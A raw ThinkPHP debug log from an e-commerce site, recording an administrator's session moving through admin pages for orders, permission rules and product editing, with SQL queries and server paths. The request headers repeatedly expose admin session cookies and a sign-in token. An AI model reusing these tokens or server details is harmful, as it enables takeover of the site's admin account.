[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000314s ] mysql:dbname=www_ldkjmy_com;host=localhost;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `yf_auth_rule` [ RunTime:0.000908s ]
[ sql ] [ SQL ] SELECT `id` FROM `yf_auth_rule` WHERE  `name` = 'admin/WebLog/weblog_list' ORDER BY level desc,sort LIMIT 1 [ RunTime:0.000201s ]
[ sql ] [ SQL ] SELECT `id`,`pid` FROM `yf_auth_rule` ORDER BY level desc,sort [ RunTime:0.000254s ]
[ sql ] [ SQL ] SELECT `id` FROM `yf_auth_rule` WHERE  `name` = 'admin/WebLog/weblog_list'  AND `status` = 1 ORDER BY level desc,sort LIMIT 1 [ RunTime:0.000199s ]
[ sql ] [ SQL ] SELECT `pid` FROM `yf_auth_rule` WHERE  `id` = 277 LIMIT 1 [ RunTime:0.000107s ]
[ sql ] [ SQL ] SELECT * FROM `yf_auth_rule` WHERE  `status` = 1  AND `pid` = 276 ORDER BY `sort` [ RunTime:0.000141s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `yf_web_log` [ RunTime:0.000675s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `yf_web_log` `a` LEFT JOIN `yf_member_list` `b` ON `b`.`member_list_id`=`a`.`uid` LIMIT 1 [ RunTime:0.000174s ]
[ sql ] [ SQL ] SELECT * FROM `yf_web_log` `a` LEFT JOIN `yf_member_list` `b` ON `b`.`member_list_id`=`a`.`uid` ORDER BY otime desc LIMIT 0,10 [ RunTime:0.000222s ]
---------------------------------------------------------------
[ 2019-11-03T21:43:26+08:00 ] 172.21.0.9 171.117.143.245 GET /public/datePicker/bootstrap-datepicker.css.map
[ info ] www.ldkjmy.com/public/datePicker/bootstrap-datepicker.css.map [运行时间：0.032523s][吞吐率：30.75req/s] [内存消耗：2,517.41kb] [文件加载：56]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'public',
    1 => 'datePicker',
    2 => 'bootstrap-datepicker.css.map',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.ldkjmy.com',
  'connection' => 'keep-alive',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'Hm_lvt_416c770ac83a9d996d7b3793f8c4994d=1571321690,1572445665; aid=1; PHPSESSID=c85qs1fha4c3sg571mg8bh0ct7; thinkphp_show_page_trace=0|0; signin_token=83935756b1c2bd505158ff25b6896ad8b3bf06bb; yf_logged_user=NbdvGdnG2bHsxZ35T',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-11-03T21:43:30+08:00 ] 172.21.0.9 171.117.143.245 GET /admin/order/orderlist.html
[ info ] www.ldkjmy.com/admin/order/orderlist.html [运行时间：0.060671s][吞吐率：16.48req/s] [内存消耗：5,058.35kb] [文件加载：81]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'order',
    2 => 'orderlist',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.ldkjmy.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'referer' => 'http://www.ldkjmy.com/admin/web_log/weblog_list.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'aid=1; PHPSESSID=c85qs1fha4c3sg571mg8bh0ct7; thinkphp_show_page_trace=0|0; signin_token=83935756b1c2bd505158ff25b6896ad8b3bf06bb; yf_logged_user=NbdvGdnG2bHsxZ35T; Hm_lvt_416c770ac83a9d996d7b3793f8c4994d=1571321690,1572445665,1572788591; Hm_lpvt_416c770ac83a9d996d7b3793f8c4994d=1572788591',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.001299s ]
[ info ] [ RUN ] app\admin\controller\Order->orderlist[ /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/admin/controller/Order.php ]
[ info ] [ VIEW ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/admin/view/order/orderlist.html [ array (
  0 => 'lang',
  1 => 'menus',
  2 => 'menus_curr',
  3 => 'menus_child',
  4 => 'id_curr',
  5 => 'admin_avatar',
  6 => 'order',
  7 => 'page',
) ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\Cron @app_end [ RunTime:0.000517s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000212s ] mysql:dbname=www_ldkjmy_com;host=localhost;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `yf_auth_rule` [ RunTime:0.000807s ]
[ sql ] [ SQL ] SELECT `id` FROM `yf_auth_rule` WHERE  `name` = 'admin/Order/orderlist' ORDER BY level desc,sort LIMIT 1 [ RunTime:0.000162s ]
[ sql ] [ SQL ] SELECT `id`,`pid` FROM `yf_auth_rule` ORDER BY level desc,sort [ RunTime:0.000250s ]
[ sql ] [ SQL ] SELECT `id` FROM `yf_auth_rule` WHERE  `name` = 'admin/Order/orderlist'  AND `status` = 1 ORDER BY level desc,sort LIMIT 1 [ RunTime:0.000154s ]
[ sql ] [ SQL ] SELECT `pid` FROM `yf_auth_rule` WHERE  `id` = 186 LIMIT 1 [ RunTime:0.000115s ]
[ sql ] [ SQL ] SELECT * FROM `yf_auth_rule` WHERE  `status` = 1  AND `pid` = 185 ORDER BY `sort` [ RunTime:0.000168s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `yf_orderdetails` [ RunTime:0.000652s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `yf_orderdetails` LIMIT 1 [ RunTime:0.000182s ]
[ sql ] [ SQL ] SELECT * FROM `yf_orderdetails` ORDER BY orderId desc LIMIT 0,10 [ RunTime:0.000107s ]
---------------------------------------------------------------
[ 2019-11-03T21:43:30+08:00 ] 172.21.0.9 171.117.143.245 GET /public/datePicker/bootstrap-datepicker.css.map
[ info ] www.ldkjmy.com/public/datePicker/bootstrap-datepicker.css.map [运行时间：0.029085s][吞吐率：34.38req/s] [内存消耗：2,517.28kb] [文件加载：56]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'public',
    1 => 'datePicker',
    2 => 'bootstrap-datepicker.css.map',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.ldkjmy.com',
  'connection' => 'keep-alive',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'aid=1; PHPSESSID=c85qs1fha4c3sg571mg8bh0ct7; thinkphp_show_page_trace=0|0; signin_token=83935756b1c2bd505158ff25b6896ad8b3bf06bb; yf_logged_user=NbdvGdnG2bHsxZ35T; Hm_lvt_416c770ac83a9d996d7b3793f8c4994d=1571321690,1572445665,1572788591; Hm_lpvt_416c770ac83a9d996d7b3793f8c4994d=1572788591',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-11-03T21:43:33+08:00 ] 172.21.0.9 171.117.143.245 GET /admin/sys/admin_rule_list.html
[ info ] www.ldkjmy.com/admin/sys/admin_rule_list.html [运行时间：0.081794s][吞吐率：12.23req/s] [内存消耗：6,097.89kb] [文件加载：78]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'sys',
    2 => 'admin_rule_list',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.ldkjmy.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'referer' => 'http://www.ldkjmy.com/admin/order/orderlist.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'aid=1; PHPSESSID=c85qs1fha4c3sg571mg8bh0ct7; thinkphp_show_page_trace=0|0; signin_token=83935756b1c2bd505158ff25b6896ad8b3bf06bb; yf_logged_user=NbdvGdnG2bHsxZ35T; Hm_lvt_416c770ac83a9d996d7b3793f8c4994d=1571321690,1572445665,1572788591; Hm_lpvt_416c770ac83a9d996d7b3793f8c4994d=1572788591',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.001418s ]
[ info ] [ RUN ] app\admin\controller\Sys->admin_rule_list[ /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/admin/controller/Sys.php ]
[ info ] [ VIEW ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/admin/view/sys/admin_rule_list.html [ array (
  0 => 'lang',
  1 => 'menus',
  2 => 'menus_curr',
  3 => 'menus_child',
  4 => 'id_curr',
  5 => 'admin_avatar',
  6 => 'admin_rule',
  7 => 'admin_rule_all',
  8 => 'pid',
) ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\Cron @app_end [ RunTime:0.000591s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000263s ] mysql:dbname=www_ldkjmy_com;host=localhost;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `yf_auth_rule` [ RunTime:0.000763s ]
[ sql ] [ SQL ] SELECT `id` FROM `yf_auth_rule` WHERE  `name` = 'admin/Sys/admin_rule_list' ORDER BY level desc,sort LIMIT 1 [ RunTime:0.000165s ]
[ sql ] [ SQL ] SELECT `id`,`pid` FROM `yf_auth_rule` ORDER BY level desc,sort [ RunTime:0.000185s ]
[ sql ] [ SQL ] SELECT `id` FROM `yf_auth_rule` WHERE  `name` = 'admin/Sys/admin_rule_list'  AND `status` = 1 ORDER BY level desc,sort LIMIT 1 [ RunTime:0.000209s ]
[ sql ] [ SQL ] SELECT `pid` FROM `yf_auth_rule` WHERE  `id` = 158 LIMIT 1 [ RunTime:0.000102s ]
[ sql ] [ SQL ] SELECT * FROM `yf_auth_rule` WHERE  `status` = 1  AND `pid` = 18 ORDER BY `sort` [ RunTime:0.000174s ]
[ sql ] [ SQL ] SELECT * FROM `yf_auth_rule` WHERE  `pid` = 0 ORDER BY `sort` [ RunTime:0.000155s ]
[ sql ] [ SQL ] SELECT * FROM `yf_auth_rule` ORDER BY `sort` [ RunTime:0.000363s ]
---------------------------------------------------------------
[ 2019-11-03T21:43:34+08:00 ] 172.21.0.9 171.117.143.245 GET /public/datePicker/bootstrap-datepicker.css.map
[ info ] www.ldkjmy.com/public/datePicker/bootstrap-datepicker.css.map [运行时间：0.027787s][吞吐率：35.99req/s] [内存消耗：2,517.28kb] [文件加载：56]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'public',
    1 => 'datePicker',
    2 => 'bootstrap-datepicker.css.map',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.ldkjmy.com',
  'connection' => 'keep-alive',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'aid=1; PHPSESSID=c85qs1fha4c3sg571mg8bh0ct7; thinkphp_show_page_trace=0|0; signin_token=83935756b1c2bd505158ff25b6896ad8b3bf06bb; yf_logged_user=NbdvGdnG2bHsxZ35T; Hm_lvt_416c770ac83a9d996d7b3793f8c4994d=1571321690,1572445665,1572788591; Hm_lpvt_416c770ac83a9d996d7b3793f8c4994d=1572788591',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-11-03T21:43:35+08:00 ] 172.21.0.9 171.117.143.245 GET /admin/product/product_list.html
[ info ] www.ldkjmy.com/admin/product/product_list.html [运行时间：0.071520s][吞吐率：13.98req/s] [内存消耗：5,572.32kb] [文件加载：81]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'product',
    2 => 'product_list',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.ldkjmy.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'referer' => 'http://www.ldkjmy.com/admin/sys/admin_rule_list.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'thinkphp_show_page_trace=0|0; aid=1; PHPSESSID=c85qs1fha4c3sg571mg8bh0ct7; thinkphp_show_page_trace=0|0; signin_token=83935756b1c2bd505158ff25b6896ad8b3bf06bb; yf_logged_user=NbdvGdnG2bHsxZ35T; Hm_lvt_416c770ac83a9d996d7b3793f8c4994d=1571321690,1572445665,1572788591; Hm_lpvt_416c770ac83a9d996d7b3793f8c4994d=1572788591',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.001483s ]
[ info ] [ RUN ] app\admin\controller\Product->product_list[ /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/admin/controller/Product.php ]
[ info ] [ VIEW ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/admin/view/product/product_list.html [ array (
  0 => 'lang',
  1 => 'menus',
  2 => 'menus_curr',
  3 => 'menus_child',
  4 => 'id_curr',
  5 => 'admin_avatar',
  6 => 'page',
  7 => 'menu',
  8 => 'product',
) ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\Cron @app_end [ RunTime:0.000617s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000202s ] mysql:dbname=www_ldkjmy_com;host=localhost;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `yf_auth_rule` [ RunTime:0.000764s ]
[ sql ] [ SQL ] SELECT `id` FROM `yf_auth_rule` WHERE  `name` = 'admin/Product/product_list' ORDER BY level desc,sort LIMIT 1 [ RunTime:0.000176s ]
[ sql ] [ SQL ] SELECT `id`,`pid` FROM `yf_auth_rule` ORDER BY level desc,sort [ RunTime:0.000236s ]
[ sql ] [ SQL ] SELECT `id` FROM `yf_auth_rule` WHERE  `name` = 'admin/Product/product_list'  AND `status` = 1 ORDER BY level desc,sort LIMIT 1 [ RunTime:0.000180s ]
[ sql ] [ SQL ] SELECT `pid` FROM `yf_auth_rule` WHERE  `id` = 11 LIMIT 1 [ RunTime:0.000167s ]
[ sql ] [ SQL ] SELECT * FROM `yf_auth_rule` WHERE  `status` = 1  AND `pid` = 7 ORDER BY `sort` [ RunTime:0.000197s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `yf_goods` [ RunTime:0.000938s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `yf_goods` `a` INNER JOIN `yf_admin` `b` ON `a`.`uid`=`b`.`admin_id` WHERE  (  product_back = 0 and uid=1 ) LIMIT 1 [ RunTime:0.000176s ]
[ sql ] [ SQL ] SELECT * FROM `yf_goods` `a` INNER JOIN `yf_admin` `b` ON `a`.`uid`=`b`.`admin_id` WHERE  (  product_back = 0 and uid=1 ) ORDER BY goodsId desc LIMIT 0,10 [ RunTime:0.000324s ]
---------------------------------------------------------------
[ 2019-11-03T21:43:35+08:00 ] 172.21.0.9 171.117.143.245 GET /public/datePicker/bootstrap-datepicker.css.map
[ info ] www.ldkjmy.com/public/datePicker/bootstrap-datepicker.css.map [运行时间：0.034068s][吞吐率：29.35req/s] [内存消耗：2,517.28kb] [文件加载：56]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'public',
    1 => 'datePicker',
    2 => 'bootstrap-datepicker.css.map',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.ldkjmy.com',
  'connection' => 'keep-alive',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'aid=1; PHPSESSID=c85qs1fha4c3sg571mg8bh0ct7; thinkphp_show_page_trace=0|0; signin_token=83935756b1c2bd505158ff25b6896ad8b3bf06bb; yf_logged_user=NbdvGdnG2bHsxZ35T; Hm_lvt_416c770ac83a9d996d7b3793f8c4994d=1571321690,1572445665,1572788591; Hm_lpvt_416c770ac83a9d996d7b3793f8c4994d=1572788591',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-11-03T21:43:41+08:00 ] 172.21.0.9 171.117.143.245 GET /admin/product/product_edit/goodsId/83.html
[ info ] www.ldkjmy.com/admin/product/product_edit/goodsId/83.html [运行时间：0.063102s][吞吐率：15.85req/s] [内存消耗：5,262.66kb] [文件加载：79]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'product',
    2 => 'product_edit',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.ldkjmy.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'referer' => 'http://www.ldkjmy.com/admin/product/product_list.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'thinkphp_show_page_trace=0|0; thinkphp_show_page_trace=0|0; aid=1; PHPSESSID=c85qs1fha4c3sg571mg8bh0ct7; thinkphp_show_page_trace=0|0; signin_token=83935756b1c2bd505158ff25b6896ad8b3bf06bb; yf_logged_user=NbdvGdnG2bHsxZ35T; Hm_lvt_416c770ac83a9d996d7b3793f8c4994d=1571321690,1572445665,1572788591; Hm_lpvt_416c770ac83a9d996d7b3793f8c4994d=1572788591',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'goodsId' => '83',
)
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.001433s ]
[ info ] [ RUN ] app\admin\controller\Product->product_edit[ /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/admin/controller/Product.php ]
[ info ] [ VIEW ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/admin/view/product/product_edit.html [ array (
  0 => 'lang',
  1 => 'menus',
  2 => 'menus_curr',
  3 => 'menus_child',
  4 => 'id_curr',
  5 => 'admin_avatar',
  6 => 'goods_extra',
) ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\Cron @app_end [ RunTime:0.000609s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000320s ] mysql:dbname=www_ldkjmy_com;host=localhost;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `yf_auth_rule` [ RunTime:0.000709s ]
[ sql ] [ SQL ] SELECT `id` FROM `yf_auth_rule` WHERE  `name` = 'admin/Product/product_edit' ORDER BY level desc,sort LIMIT 1 [ RunTime:0.000151s ]
[ sql ] [ SQL ] SELECT `id` FROM `yf_auth_rule` WHERE  `name` = 'admin/Product/product_edit' ORDER BY level desc,sort LIMIT 1 [ RunTime:0.000159s ]
[ sql ] [ SQL ] SELECT `id` FROM `yf_auth_rule` WHERE  `name` = 'admin/Product/product_edit'  AND `status` = 1 ORDER BY level desc,sort LIMIT 1 [ RunTime:0.000183s ]
[ sql ] [ SQL ] SELECT `id` FROM `yf_auth_rule` WHERE  `name` = 'admin/Product/product_edit'  AND `status` = 1 ORDER BY level desc,sort LIMIT 1 [ RunTime:0.000155s ]
[ sql ] [ SQL ] SELECT `pid` FROM `yf_auth_rule` WHERE  `id` = 0 LIMIT 1 [ RunTime:0.000153s ]
[ sql ] [ SQL ] SELECT * FROM `yf_auth_rule` WHERE  `status` = 1  AND `pid` = null ORDER BY `sort` [ RunTime:0.000158s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `yf_goods` [ RunTime:0.000737s ]
[ sql ] [ SQL ] SELECT * FROM `yf_goods` WHERE  `goodsId` = 83 LIMIT 1 [ RunTime:0.000237s ]
---------------------------------------------------------------
[ 2019-11-03T21:43:41+08:00 ] 172.21.0.9 171.117.143.245 GET /public/datePicker/bootstrap-datepicker.css.map
[ info ] www.ldkjmy.com/public/datePicker/bootstrap-datepicker.css.map [运行时间：0.030448s][吞吐率：32.84req/s] [内存消耗：2,517.28kb] [文件加载：56]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'public',
    1 => 'datePicker',
    2 => 'bootstrap-datepicker.css.map',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.ldkjmy.com',
  'connection' => 'keep-alive',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'aid=1; PHPSESSID=c85qs1fha4c3sg571mg8bh0ct7; thinkphp_show_page_trace=0|0; signin_token=83935756b1c2bd505158ff25b6896ad8b3bf06bb; yf_logged_user=NbdvGdnG2bHsxZ35T; Hm_lvt_416c770ac83a9d996d7b3793f8c4994d=1571321690,1572445665,1572788591; Hm_lpvt_416c770ac83a9d996d7b3793f8c4994d=1572788591',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-11-03T23:42:28+08:00 ] 172.21.0.9 54.36.150.170 GET /
[ info ] www.ldkjmy.com/ [运行时间：0.035433s][吞吐率：28.22req/s] [内存消耗：3,485.03kb] [文件加载：73]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'home',
    1 => 'Index',
    2 => 'index',
  ),
  'convert' => false,
)
[ info ] [ HEADER ] array (
  'host' => 'www.ldkjmy.com',
  'user-agent' => 'Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)',
  'accept' => '*/*',
  'accept-encoding' => 'deflate, gzip',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/home/lang/zh-cn.php
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.001177s ]
[ info ] [ RUN ] app\home\controller\Index->index[ /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/home/controller/Index.php ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\Cron @app_end [ RunTime:0.000506s ]
[ info ] [ LOG ] INIT File
